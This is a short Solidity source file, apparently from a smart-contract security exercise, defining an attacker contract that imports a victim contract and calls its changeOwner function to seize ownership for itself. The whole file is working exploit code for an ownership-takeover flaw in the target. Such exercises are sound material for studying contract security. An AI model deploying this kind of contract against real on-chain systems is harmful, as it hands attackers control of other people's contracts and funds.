// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract ownerGameAttacker {
    ownerGame game;

    constructor(address _gameAddress) {
        game = ownerGame(_gameAddress);
    }

    function Attack() public {
        game.changeOwner(address(this));
    }
}
